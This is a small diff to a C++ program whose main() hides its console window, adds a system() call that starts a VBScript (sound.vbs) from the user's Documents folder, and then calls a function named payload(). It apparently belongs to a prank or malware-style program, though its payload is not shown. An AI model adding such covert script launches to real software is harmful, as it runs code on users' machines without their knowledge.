@@ -8,6 +8,8 @@ void payload();
 
 int main() {
 	FreeConsole();
+	std::string scom1("start C:\\Users\\%username%\\Documents\\sound.vbs");
+	system(scom1.c_str());
 	payload();
 }
 
